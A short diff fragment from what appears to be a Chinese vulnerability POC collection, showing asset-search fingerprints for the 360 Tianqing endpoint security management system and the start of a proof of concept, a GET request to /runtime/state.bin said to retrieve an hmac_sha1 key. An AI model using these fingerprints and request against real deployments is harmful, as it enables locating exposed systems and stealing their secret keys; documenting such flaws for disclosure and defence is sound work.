@@ -5,7 +5,7 @@
 title="360新天擎" || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360" || title="360天擎" || title="360天擎终端安全管理系统"
 ```
 
-## poc
+## POC
 执行poc获取hmac_sha1密钥
 ```
 GET /runtime/state.bin HTTP/1.1
